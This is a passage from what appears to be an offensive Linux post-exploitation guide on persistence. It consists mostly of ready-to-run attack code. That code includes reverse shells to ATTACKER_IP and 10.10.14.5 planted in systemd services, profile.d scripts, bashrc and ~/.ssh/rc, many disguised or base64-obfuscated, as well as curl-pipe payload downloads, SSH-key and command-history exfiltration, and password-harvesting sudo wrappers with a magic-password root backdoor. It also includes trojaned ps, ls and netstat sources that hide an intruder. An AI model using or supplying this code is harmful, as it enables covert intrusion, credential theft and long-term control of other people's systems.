cat > /usr/local/lib/system-monitor/monitor.sh << 'EOF'
#!/bin/bash
while true; do
    if ! nc -z ATTACKER_IP 4444 2>/dev/null; then
        sleep 60
        continue
    fi
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    sleep 60
done
EOF
chmod +x /usr/local/lib/system-monitor/monitor.sh
```

**Create service file:**

```bash
cat > /etc/systemd/system/system-monitor.service << 'EOF'
[Unit]
Description=System Resource Monitor
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/local/lib/system-monitor/monitor.sh
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable system-monitor.service
systemctl start system-monitor.service
```

#### Stealthy Systemd Persistence

**Legitimate-looking service names:**

```bash
# Examples that blend with real services
system-health-monitor.service
network-diagnostics.service
update-notifier.service
hardware-monitor.service
log-analyzer.service
```

**Hidden service in subdirectory:**

```bash
mkdir -p /etc/systemd/system/multi-user.target.wants/
cat > /etc/systemd/system/multi-user.target.wants/.system.service << 'EOF'
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl start .system.service
```

**Timer-based execution (systemd timers):**

```bash
# Create service
cat > /etc/systemd/system/backup.service << 'EOF'
[Unit]
Description=Backup Service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/backup.sh
EOF

# Create timer
cat > /etc/systemd/system/backup.timer << 'EOF'
[Unit]
Description=Backup Timer

[Timer]
OnCalendar=*:0/15
Persistent=true

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable backup.timer
systemctl start backup.timer
```

**Service that runs only on boot:**

```bash
cat > /etc/systemd/system/boot-setup.service << 'EOF'
[Unit]
Description=Boot Configuration Setup
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/boot-setup.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
```

#### Advanced Systemd Techniques

**Service with automatic restart on failure:**

```bash
[Service]
Type=simple
ExecStart=/path/to/backdoor
Restart=on-failure
RestartSec=5s
StartLimitInterval=0
```

**Service masquerading as system component:**

```bash
cat > /etc/systemd/system/systemd-resolved-update.service << 'EOF'
[Unit]
Description=Network Name Resolution Update
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/systemd-resolved-update
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Create fake binary location
mkdir -p /usr/lib/systemd
cat > /usr/lib/systemd/systemd-resolved-update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /usr/lib/systemd/systemd-resolved-update
```

**User-level systemd service (no root required):**

```bash
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/update-check.service << 'EOF'
[Unit]
Description=Update Checker

[Service]
Type=simple
ExecStart=/home/user/.local/bin/update-check.sh
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable update-check.service
systemctl --user start update-check.service
```

**Disable service logging (avoid detection):**

```bash
[Service]
StandardOutput=null
StandardError=null
```

### /etc/profile.d Manipulation

The `/etc/profile.d/` directory contains scripts executed during user login. Malicious scripts here execute for all users, providing persistent access whenever users authenticate.

#### Understanding /etc/profile.d

**Execution flow:**

1. User logs in via SSH or console
2. `/etc/profile` sources scripts in `/etc/profile.d/*.sh`
3. All `.sh` files in directory execute
4. User session begins with backdoor active

**Advantages:**

- Executes for all users
- Runs in user context (less suspicious)
- Difficult to detect without inspecting directory
- Survives system updates

#### Basic /etc/profile.d Backdoor

**Create backdoor script:**

```bash
cat > /etc/profile.d/system-env.sh << 'EOF'
#!/bin/bash
# System environment configuration
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
EOF
chmod +x /etc/profile.d/system-env.sh
```

**Non-blocking backdoor (doesn't delay login):**

```bash
cat > /etc/profile.d/update-check.sh << 'EOF'
#!/bin/bash
(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &
EOF
chmod +x /etc/profile.d/update-check.sh
```

#### Conditional /etc/profile.d Backdoors

**Execute only for specific users:**

```bash
cat > /etc/profile.d/user-config.sh << 'EOF'
#!/bin/bash
if [ "$USER" = "admin" ] || [ "$USER" = "root" ]; then
    (bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &
fi
EOF
chmod +x /etc/profile.d/user-config.sh
```

**Execute only during specific times:**

```bash
cat > /etc/profile.d/time-sync.sh << 'EOF'
#!/bin/bash
HOUR=$(date +%H)
if [ $HOUR -ge 18 ] || [ $HOUR -le 6 ]; then
    (bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &
fi
EOF
chmod +x /etc/profile.d/time-sync.sh
```

**Execute only from specific networks:**

```bash
cat > /etc/profile.d/network-config.sh << 'EOF'
#!/bin/bash
if [ -n "$SSH_CONNECTION" ]; then
    SOURCE_IP=$(echo $SSH_CONNECTION | awk '{print $1}')
    if [[ $SOURCE_IP == 192.168.1.* ]]; then
        (bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &
    fi
fi
EOF
chmod +x /etc/profile.d/network-config.sh
```

#### Stealthy /etc/profile.d Techniques

**Hide among legitimate scripts:**

```bash
# Use names similar to existing scripts
ls /etc/profile.d/
# Examples: bash_completion.sh, colorls.sh, lang.sh

# Create similar name
cat > /etc/profile.d/bash_profile.sh << 'EOF'
#!/bin/bash
(curl -s http://ATTACKER_IP/shell.sh | bash &) &
EOF
chmod +x /etc/profile.d/bash_profile.sh
```

**Obfuscate payload:**

```bash
cat > /etc/profile.d/locale-config.sh << 'EOF'
#!/bin/bash
# Locale configuration
export LC_TIME="en_US.UTF-8"
eval "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE= | base64 -d)" &
EOF
chmod +x /etc/profile.d/locale-config.sh
```

**Add to existing legitimate script:**

```bash
# Append to existing script
cat >> /etc/profile.d/bash_completion.sh << 'EOF'

# Connection check
(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) 2>/dev/null &
EOF
```

**Use hidden filename:**

```bash
cat > /etc/profile.d/.system.sh << 'EOF'
#!/bin/bash
(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &
EOF
chmod +x /etc/profile.d/.system.sh
```

#### Advanced /etc/profile.d Payloads

**Download and execute payload:**

```bash
cat > /etc/profile.d/update-client.sh << 'EOF'
#!/bin/bash
if [ ! -f /tmp/.updated ]; then
    curl -s http://ATTACKER_IP/payload.sh -o /tmp/.payload
    chmod +x /tmp/.payload
    (/tmp/.payload &) &
    touch /tmp/.updated
fi
EOF
chmod +x /etc/profile.d/update-client.sh
```

**SSH key harvesting:**

```bash
cat > /etc/profile.d/ssh-config.sh << 'EOF'
#!/bin/bash
if [ -f ~/.ssh/id_rsa ]; then
    curl -s -X POST -d "user=$USER&key=$(cat ~/.ssh/id_rsa | base64)" http://ATTACKER_IP/collect.php 2>/dev/null &
fi
EOF
chmod +x /etc/profile.d/ssh-config.sh
```

**Command logging (keylogger-style):**

```bash
cat > /etc/profile.d/history-backup.sh << 'EOF'
#!/bin/bash
PROMPT_COMMAND='history 1 | curl -s -X POST -d "user=$USER&cmd=$(cat)" http://ATTACKER_IP/log.php 2>/dev/null &'
EOF
chmod +x /etc/profile.d/history-backup.sh
```

**Environment variable manipulation:**

```bash
cat > /etc/profile.d/path-config.sh << 'EOF'
#!/bin/bash
export PATH="/tmp/.tools:$PATH"
(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &
EOF
chmod +x /etc/profile.d/path-config.sh
```

#### Alternative Login Script Locations

**Other profile locations for persistence:**

**/etc/bash.bashrc (Debian/Ubuntu):**

```bash
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &' >> /etc/bash.bashrc
```

**/etc/bashrc (RHEL/CentOS):**

```bash
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &' >> /etc/bashrc
```

**~/.bashrc (user-specific):**

```bash
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &' >> ~/.bashrc
```

**~/.bash_profile:**

```bash
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &' >> ~/.bash_profile
```

**/etc/profile:**

```bash
echo '(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &) &' >> /etc/profile
```

#### Testing /etc/profile.d Backdoors

**Test without logging out:**

```bash
# Source the script manually
source /etc/profile.d/your-backdoor.sh

# Or reload profile
source /etc/profile
```

**Verify execution on new login:**

```bash
# From another terminal
ssh user@localhost
# Check if backdoor connected
```

**Check for syntax errors:**

```bash
bash -n /etc/profile.d/your-backdoor.sh
```

---

### Bash RC File Modification

Bash RC file modification establishes persistence by injecting malicious code into shell initialization files that execute automatically when users spawn shells, providing sustained access through legitimate system processes.

**Understanding Shell Initialization Files**

```bash
# Shell initialization order for interactive login shells:
# 1. /etc/profile
# 2. ~/.bash_profile or ~/.bash_login or ~/.profile (first found)
# 3. ~/.bashrc (usually sourced from profile)

# For non-login interactive shells:
# 1. /etc/bash.bashrc (Debian/Ubuntu) or /etc/bashrc (RHEL/CentOS)
# 2. ~/.bashrc

# Identify which files exist on target
ls -la /etc/profile /etc/bash.bashrc /etc/bashrc 2>/dev/null
ls -la ~/.bash_profile ~/.bash_login ~/.profile ~/.bashrc 2>/dev/null
```

**System-Wide Persistence via /etc/profile**

```bash
# Check write permissions
ls -la /etc/profile
# Output: -rw-r--r-- 1 root root 575 Oct 10 10:00 /etc/profile

# Verify current user can modify (if compromised as root)
[ -w /etc/profile ] && echo "Writable"

# Backup original file
cp /etc/profile /etc/profile.bak.$(date +%s)

# Add reverse shell that triggers for root only
cat >> /etc/profile << 'EOF'

# System update check
if [ "$UID" -eq 0 ] 2>/dev/null; then
    (bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &) 2>/dev/null
fi
EOF
```

**Stealthy /etc/bash.bashrc Modification**

```bash
# More subtle approach with error handling
cat >> /etc/bash.bashrc << 'EOF'

# System environment initialization
if [ -n "$BASH_VERSION" ]; then
    # Check if running as privileged user
    if [ $(id -u) -eq 0 ] 2>/dev/null; then
        # Background persistence callback
        {
            sleep 5
            if command -v curl >/dev/null 2>&1; then
                curl -s http://10.10.14.5:8080/$(hostname) >/dev/null 2>&1
            elif command -v wget >/dev/null 2>&1; then
                wget -q -O /dev/null http://10.10.14.5:8080/$(hostname) 2>&1
            fi
        } &
    fi
fi
EOF
```

**User-Specific ~/.bashrc Persistence**

```bash
# Target specific user's bashrc
USER_TARGET="admin"
BASHRC_PATH="/home/$USER_TARGET/.bashrc"

# Verify accessibility
[ -w "$BASHRC_PATH" ] && echo "Target bashrc is writable"

# Add backdoor at end of file
cat >> "$BASHRC_PATH" << 'EOF'

# User environment customization
_system_check() {
    local beacon_server="10.10.14.5"
    local beacon_port="443"
    
    # Attempt connection every shell spawn
    if timeout 2 bash -c "echo >/dev/tcp/$beacon_server/$beacon_port" 2>/dev/null; then
        bash -i >& /dev/tcp/$beacon_server/$beacon_port 0>&1 2>/dev/null &
    fi
}

# Execute in background to avoid blocking shell startup
(_system_check &) 2>/dev/null
EOF
```

**Advanced Obfuscation Techniques**

```bash
# Base64 encoded payload to avoid detection
PAYLOAD='bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
ENCODED=$(echo "$PAYLOAD" | base64 -w 0)

cat >> ~/.bashrc << EOF

# System locale configuration
if [ -n "\$BASH_VERSION" ]; then
    eval "\$(echo '$ENCODED' | base64 -d)" 2>/dev/null &
fi
EOF
```

**Function Hijacking in RC Files**

```bash
# Override common commands with backdoored versions
cat >> ~/.bashrc << 'EOF'

# Command aliases
cd() {
    builtin cd "$@"
    
    # Trigger on specific directory access
    if [[ "$PWD" == "/root" ]] 2>/dev/null; then
        (bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &) 2>/dev/null
    fi
}

sudo() {
    # Log sudo commands
    echo "$(date): $USER executed: sudo $*" >> /tmp/.sudo_log 2>/dev/null
    
    # Execute real sudo
    command sudo "$@"
}

ssh() {
    # Capture SSH credentials
    {
        echo "$(date): ssh $*" >> /tmp/.ssh_log
        echo "$*" | grep -oP '\w+@[\w\.-]+' >> /tmp/.targets
    } 2>/dev/null
    
    command ssh "$@"
}
EOF
```

**Conditional Execution Based on User/Host**

```bash
cat >> ~/.bashrc << 'EOF'

# Environment configuration
_init_check() {
    # Only trigger for specific users
    local target_users=("root" "admin" "administrator")
    
    for user in "${target_users[@]}"; do
        if [ "$USER" = "$user" ]; then
            # Establish callback
            {
                sleep 3
                bash -c 'exec bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
            } &>/dev/null &
            return
        fi
    done
    
    # Trigger only on specific hosts
    if [[ "$(hostname)" =~ ^(prod|production|server) ]]; then
        (curl -s http://10.10.14.5:8080/checkin/$(hostname) &) 2>/dev/null
    fi
}

_init_check
unset -f _init_check
EOF
```

**Time-Based Persistence Triggers**

```bash
cat >> ~/.bashrc << 'EOF'

# System maintenance scheduler
_maintenance_check() {
    # Only trigger during specific hours (off-hours)
    local current_hour=$(date +%H)
    
    if [ $current_hour -ge 22 ] || [ $current_hour -le 6 ]; then
        {
            # Establish reverse shell during off-hours
            bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
        } 2>/dev/null &
    fi
}

(_maintenance_check &) 2>/dev/null
EOF
```

**SSH RC File Persistence**

```bash
# SSH-specific RC files execute on SSH connection
mkdir -p ~/.ssh
cat > ~/.ssh/rc << 'EOF'
#!/bin/bash

# SSH session initialization
{
    echo "$(date): SSH login from $SSH_CLIENT" >> /tmp/.ssh_access.log
    
    # Establish persistent connection
    if [ $(id -u) -eq 0 ]; then
        (bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &) 2>/dev/null
    fi
} 2>/dev/null
EOF

chmod 700 ~/.ssh/rc
```

**Detection Evasion Techniques**

```bash
# Hide malicious code within legitimate-looking functions
cat >> ~/.bashrc << 'EOF'

# Terminal color configuration
_configure_colors() {
    # Set color variables (legitimate functionality)
    export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
    export LS_COLORS='di=34:ln=35:so=32:pi=33:ex=31:bd=34;46:cd=34;43:su=30;41'
    
    # Hidden payload in legitimate-looking code
    local _sys_check="YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ=="
    [ $(id -u) -eq 0 ] && (eval "$(echo $_sys_check | base64 -d)" &) 2>/dev/null
}

_configure_colors
EOF
```

**Profile.d Directory Persistence**

```bash
# Many distributions source scripts from /etc/profile.d/
ls -la /etc/profile.d/

# Create custom initialization script
cat > /etc/profile.d/system-update.sh << 'EOF'
#!/bin/bash

# System update notification service
if [ "$UID" -eq 0 ] 2>/dev/null; then
    {
        sleep 10
        # Hidden callback
        bash -c 'exec bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &
    } 2>/dev/null &
fi
EOF

chmod +x /etc/profile.d/system-update.sh
```

**Automated RC Backdoor Installation Script**

```bash
#!/bin/bash
# rc_persistence_installer.sh

TARGET_USER="${1:-root}"
CALLBACK_IP="10.10.14.5"
CALLBACK_PORT="4444"

# Determine target RC file
if [ "$TARGET_USER" = "root" ]; then
    RC_FILE="/root/.bashrc"
else
    RC_FILE="/home/$TARGET_USER/.bashrc"
fi

# Verify file exists and is writable
if [ ! -w "$RC_FILE" ]; then
    echo "[-] Cannot write to $RC_FILE"
    exit 1
fi

# Create backup
cp "$RC_FILE" "${RC_FILE}.bak.$(date +%s)"

# Generate obfuscated payload
PAYLOAD="bash -i >& /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT 0>&1"
ENCODED=$(echo "$PAYLOAD" | base64 -w 0)

# Inject persistence
cat >> "$RC_FILE" << EOF

# System environment configuration
_env_init() {
    if [ \$(id -u) -eq 0 ] 2>/dev/null; then
        (eval "\$(echo '$ENCODED' | base64 -d)" &) 2>/dev/null
    fi
}

(_env_init &) 2>/dev/null
unset -f _env_init
EOF

echo "[+] Persistence installed in $RC_FILE"
echo "[+] Backup saved to ${RC_FILE}.bak.*"
echo "[+] Callback: $CALLBACK_IP:$CALLBACK_PORT"
```

**Persistence Verification**

```bash
#!/bin/bash
# verify_rc_persistence.sh

echo "[*] Checking for RC file persistence..."

# Files to check
RC_FILES=(
    "/etc/profile"
    "/etc/bash.bashrc"
    "/etc/bashrc"
    "/root/.bashrc"
    "/root/.bash_profile"
)

# Add all user bashrc files
for user_home in /home/*; do
    [ -d "$user_home" ] && RC_FILES+=("$user_home/.bashrc")
done

# Check each file for suspicious patterns
for rc_file in "${RC_FILES[@]}"; do
    if [ -f "$rc_file" ]; then
        # Look for common backdoor patterns
        if grep -qE '/dev/tcp|base64.*-d|curl.*http|wget.*http|nc.*-e' "$rc_file" 2>/dev/null; then
            echo "[!] Suspicious content in: $rc_file"
            grep -nE '/dev/tcp|base64.*-d|curl.*http|wget.*http|nc.*-e' "$rc_file"
        fi
    fi
done

# Check profile.d directory
if [ -d /etc/profile.d ]; then
    echo "[*] Checking /etc/profile.d/ scripts..."
    grep -rE '/dev/tcp|base64.*-d|curl.*http|wget.*http' /etc/profile.d/ 2>/dev/null
fi
```

### Sudo Command Wrapper

Sudo command wrappers intercept sudo execution to capture credentials, log commands, or establish privilege escalation backdoors by replacing or wrapping the legitimate sudo binary.

**Understanding Sudo Wrapper Technique**

```bash
# Normal sudo execution path
which sudo
# Output: /usr/bin/sudo

# PATH search order determines which sudo executes
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Wrapper placed in higher-priority PATH directory intercepts execution
```

**Basic Sudo Wrapper Implementation**

```bash
# Create wrapper script
cat > /usr/local/bin/sudo << 'EOF'
#!/bin/bash

# Log the command attempt
echo "$(date) - $USER attempted: sudo $@" >> /tmp/.sudo_wrapper.log 2>/dev/null

# Capture password if provided via stdin
if [ -t 0 ]; then
    # Interactive mode - prompt for password
    echo "[sudo] password for $USER: " >&2
    read -s password
    echo "$USER:$password" >> /tmp/.sudo_creds.log 2>/dev/null
    echo
fi

# Execute real sudo
exec /usr/bin/sudo "$@"
EOF

chmod +x /usr/local/bin/sudo

# Verify wrapper is in PATH before real sudo
which sudo
# Should show: /usr/local/bin/sudo
```

**Advanced Credential-Harvesting Wrapper**

```bash
cat > /usr/local/bin/sudo << 'EOF'
#!/bin/bash

REAL_SUDO="/usr/bin/sudo"
LOG_FILE="/var/tmp/.system/access.log"
CRED_FILE="/var/tmp/.system/credentials.db"

# Create hidden log directory
mkdir -p /var/tmp/.system 2>/dev/null
chmod 700 /var/tmp/.system 2>/dev/null

# Log attempt
{
    echo "=== $(date) ==="
    echo "User: $USER"
    echo "UID: $(id -u)"
    echo "Command: $@"
    echo "PWD: $PWD"
    echo "TTY: $(tty)"
} >> "$LOG_FILE" 2>/dev/null

# Check if password prompt will appear
if ! $REAL_SUDO -n true 2>/dev/null; then
    # Password required - intercept it
    echo -n "[sudo] password for $USER: " >&2
    
    # Read password without echoing
    IFS= read -rs password
    echo >&2
    
    # Store credentials
    {
        echo "$(date)|$USER|$password|$(hostname)"
    } >> "$CRED_FILE" 2>/dev/null
    
    # Pass password to real sudo via stdin
    echo "$password" | $REAL_SUDO -S "$@"
    exit_code=$?
else
    # No password needed - execute directly
    $REAL_SUDO "$@"
    exit_code=$?
fi

# Log result
echo "Exit code: $exit_code" >> "$LOG_FILE" 2>/dev/null
exit $exit_code
EOF

chmod +x /usr/local/bin/sudo
```

**Backdoor-Enabled Sudo Wrapper**

```bash
cat > /usr/local/bin/sudo << 'EOF'
#!/bin/bash

REAL_SUDO="/usr/bin/sudo"
MAGIC_PASSWORD="Tr0j4n!2024"

# Check if magic password was provided
if [ "$1" = "$MAGIC_PASSWORD" ]; then
    # Backdoor activated - spawn root shell
    shift
    exec /bin/bash -p
fi

# Check for magic environment variable
if [ "$SUDO_BACKDOOR" = "enabled" ]; then
    # Alternative backdoor trigger
    exec /bin/bash -p
fi

# Normal sudo execution
exec $REAL_SUDO "$@"
EOF

chmod +x /usr/local/bin/sudo

# Usage of backdoor:
# sudo Tr0j4n!2024
# or
# SUDO_BACKDOOR=enabled sudo
```

**Wrapper with Remote Callback**

```bash
cat > /usr/local/bin/sudo << 'EOF'
#!/bin/bash

REAL_SUDO="/usr/bin/sudo"
CALLBACK_SERVER="10.10.14.5"
CALLBACK_PORT="8080"

# Exfiltrate command attempt
{
    curl -s -m 2 "http://$CALLBACK_SERVER:$CALLBACK_PORT/log" \
        -H "Content-Type: application/json" \
        -d "{\"user\":\"$USER\",\"command\":\"$*\",\"host\":\"$(hostname)\",\"time\":\"$(date)\"}" \
        2>/dev/null &
} &

# Check if sudo will prompt for password
if ! $REAL_SUDO -n true 2>/dev/null; then
    # Capture password
    echo -n "[sudo] password for $USER: " >&2
    read -rs password
    echo >&2
    
    # Exfiltrate credentials
    {
        curl -s -m 2 "http://$CALLBACK_SERVER:$CALLBACK_PORT/creds" \
            -d "user=$USER&pass=$password&host=$(hostname)" \
            2>/dev/null &
    } &
    
    # Execute with captured password
    echo "$password" | $REAL_SUDO -S "$@"
else
    $REAL_SUDO "$@"
fi
EOF

chmod +x /usr/local/bin/sudo
```

**Persistent PATH Manipulation for Wrapper**

```bash
# Ensure wrapper directory is in PATH for all users

# System-wide via /etc/environment
cat >> /etc/environment << 'EOF'
PATH="/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin"
EOF

# Via /etc/profile
cat >> /etc/profile << 'EOF'
export PATH="/usr/local/bin:$PATH"
EOF

# Create symbolic link to ensure precedence
ln -sf /usr/local/bin/sudo /usr/sbin/sudo.wrapper

# Verify precedence
type -a sudo
# Should show wrapper first
```

**Alias-Based Sudo Wrapper**

```bash
# Alternative to PATH manipulation - use shell aliases
cat >> /etc/bash.bashrc << 'EOF'

# System command aliases
alias sudo='_sudo_wrapper'

_sudo_wrapper() {
    local log_file="/var/tmp/.cmd_history"
    
    # Log command
    echo "$(date)|$USER|$*" >> "$log_file" 2>/dev/null
    
    # Check for backdoor trigger
    if [ "$1" = "--backdoor" ]; then
        /bin/bash -p
        return
    fi
    
    # Execute real sudo
    command sudo "$@"
}
EOF
```

**Function-Based Wrapper with Credential Validation**

```bash
cat >> ~/.bashrc << 'EOF'

# Enhanced sudo wrapper function
sudo() {
    local real_sudo="/usr/bin/sudo"
    local cred_store="/tmp/.validated_creds"
    
    # If magic flag is present, bypass to root
    if [ "$1" = "--root-access-bypass" ]; then
        shift
        exec $real_sudo su -
    fi
    
    # Check if we need password
    if ! $real_sudo -n true 2>/dev/null; then
        # Password required
        echo -n "[sudo] password for $USER: " >&2
        read -rs pass
        echo >&2
        
        # Validate and store
        if echo "$pass" | $real_sudo -S true 2>/dev/null; then
            echo "$USER:$pass:$(date +%s)" >> "$cred_store" 2>/dev/null
            echo "$pass" | $real_sudo -S "$@"
        else
            echo "Sorry, try again." >&2
            return 1
        fi
    else
        $real_sudo "$@"
    fi
}
EOF
```

**Wrapper Persistence Across Updates**

```bash
#!/bin/bash
# maintain_sudo_wrapper.sh

WRAPPER="/usr/local/bin/sudo"
REAL_SUDO="/usr/bin/sudo"

# Monitor for sudo updates and restore wrapper
while true; do
    # Check if wrapper exists
    if [ ! -f "$WRAPPER" ] || ! grep -q "REAL_SUDO" "$WRAPPER" 2>/dev/null; then
        echo "[*] Wrapper missing or corrupted, reinstalling..."
        
        # Reinstall wrapper
        cat > "$WRAPPER" << 'EOF'
#!/bin/bash
REAL_SUDO="/usr/bin/sudo"
echo "$(date)|$USER|$@" >> /tmp/.sudo_log 2>/dev/null
exec $REAL_SUDO "$@"
EOF
        chmod +x "$WRAPPER"
    fi
    
    sleep 300  # Check every 5 minutes
done
```

**Systemd Service for Wrapper Persistence**

```bash
# Create systemd service to maintain wrapper
cat > /etc/systemd/system/sudo-monitor.service << 'EOF'
[Unit]
Description=System Sudo Configuration Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/maintain_sudo_wrapper.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sudo-monitor.service
systemctl start sudo-monitor.service
```

**Detection and Cleanup Evasion**

```bash
# Make wrapper appear as legitimate binary
cat > /usr/local/bin/sudo << 'EOF'
#!/bin/bash

# Mimic real sudo's --version output
if [ "$1" = "--version" ]; then
    /usr/bin/sudo --version
    exit 0
fi

# Mimic real sudo's --help output
if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    /usr/bin/sudo --help
    exit 0
fi

# Hidden functionality
REAL_SUDO="/usr/bin/sudo"
LOG="/var/tmp/.../.log"  # Hidden with multiple dots

mkdir -p "$(dirname "$LOG")" 2>/dev/null
echo "$(date +%s)|$USER|$*" >> "$LOG" 2>/dev/null

exec $REAL_SUDO "$@"
EOF

chmod +x /usr/local/bin/sudo

# Match modification time of real sudo
touch -r /usr/bin/sudo /usr/local/bin/sudo
```

**Wrapper Installation Verification**

```bash
#!/bin/bash
# verify_sudo_wrapper.sh

echo "[*] Verifying sudo wrapper installation..."

# Check PATH order
SUDO_PATH=$(which sudo)
echo "[*] Sudo path: $SUDO_PATH"

# Verify it's a script not a binary
if file "$SUDO_PATH" | grep -q "shell script"; then
    echo "[+] Wrapper is active (shell script)"
    
    # Check wrapper content
    if grep -q "REAL_SUDO\|/usr/bin/sudo" "$SUDO_PATH"; then
        echo "[+] Wrapper correctly references real sudo"
    fi
else
    echo "[-] Wrapper not detected, sudo is binary"
fi

# Check for logging functionality
if grep -qE 'log|\.log|tee' "$SUDO_PATH" 2>/dev/null; then
    echo "[+] Logging functionality detected"
fi

# Test backdoor
if grep -qE 'backdoor|magic|bypass' "$SUDO_PATH" 2>/dev/null; then
    echo "[+] Backdoor mechanism present"
fi
```

### Rootkit Installation

Rootkit installation conceals attacker presence through kernel-level or userspace modifications that hide processes, files, network connections, and maintain persistent privileged access while evading detection.

**Rootkit Categories**

```bash
# Kernel-level rootkits: Operate at kernel space (LKM - Loadable Kernel Modules)
# - Highest privileges
# - Hardest to detect
# - Kernel version specific

# Userspace rootkits: Operate in user space
# - Modify system binaries
# - Library injection
# - Easier to implement
```

**Userspace Rootkit: Binary Replacement**

Replace system binaries with trojaned versions:

```bash
#!/bin/bash
# trojan_binaries.sh

# Binaries commonly replaced
TARGETS=(
    "/bin/ps"
    "/bin/netstat"
    "/bin/ls"
    "/usr/bin/find"
    "/usr/bin/top"
    "/usr/bin/who"
)

HIDE_PROCESS="backdoor"
HIDE_DIR="/var/tmp/.hidden"
HIDE_PORT="4444"

# Backup original binaries
BACKUP_DIR="/usr/local/lib/.backup"
mkdir -p "$BACKUP_DIR" 2>/dev/null

for binary in "${TARGETS[@]}"; do
    [ -f "$binary" ] && cp "$binary" "$BACKUP_DIR/$(basename $binary).orig"
done

# Create trojaned 'ps' that hides specific process
cat > /tmp/ps_trojan.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define HIDE_PROCESS "backdoor"
#define REAL_PS "/usr/local/lib/.backup/ps.orig"

int main(int argc, char *argv[]) {
    FILE *fp;
    char line[512];
    char cmd[1024];
    
    // Build command for real ps
    snprintf(cmd, sizeof(cmd), "%s", REAL_PS);
    for (int i = 1; i < argc; i++) {
        strcat(cmd, " ");
        strcat(cmd, argv[i]);
    }
    
    // Execute real ps
    fp = popen(cmd, "r");
    if (!fp) {
        return 1;
    }
    
    // Filter output
    while (fgets(line, sizeof(line), fp)) {
        // Hide lines containing target process
        if (!strstr(line, HIDE_PROCESS)) {
            printf("%s", line);
        }
    }
    
    pclose(fp);
    return 0;
}
EOF

# Compile trojaned binary
gcc -o /bin/ps /tmp/ps_trojan.c
chmod +x /bin/ps
touch -r "$BACKUP_DIR/ps.orig" /bin/ps  # Match original timestamp
```

**Trojaned ls Binary**

```c
// ls_trojan.c - Hide specific files and directories
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define REAL_LS "/usr/local/lib/.backup/ls.orig"
#define HIDE_FILE ".hidden"
#define HIDE_DIR "/var/tmp/.system"

int main(int argc, char *argv[]) {
    FILE *fp;
    char line[512];
    char cmd[2048] = REAL_LS;
    
    // Append arguments
    for (int i = 1; i < argc; i++) {
        strcat(cmd, " ");
        strcat(cmd, argv[i]);
    }
    
    fp = popen(cmd, "r");
    if (!fp) return 1;
    
    // Filter output
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, HIDE_FILE) == NULL &&
            strstr(line, HIDE_DIR) == NULL) {
            printf("%s", line);
        }
    }
    
    pclose(fp);
    return 0;
}
```

Compile and deploy:

```bash
gcc -o /bin/ls /tmp/ls_trojan.c
chmod +x /bin/ls
touch -r /usr/local/lib/.backup/ls.orig /bin/ls
```

**Trojaned netstat for Port Hiding**

```c
// netstat_trojan.c - Hide specific network connections
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REAL_NETSTAT "/usr/local/lib/.backup/netstat.orig"
#define HIDE_PORT "4444"
#define HIDE_IP "10.10.14.5"

int main(int argc, char *argv[]) {
    FILE *fp;
    char line[1024];
    char cmd[2048] = REAL_NETSTAT;
    
    for (int i = 1; i < argc; i++) {
        strcat(cmd, " ");
        strcat(cmd, argv[i]);
    }
    
    fp = popen(cmd, "r");
    if (!fp) return 1;
    
    while (fgets(line, sizeof(line), fp)) {
        // Hide lines containing target port or IP
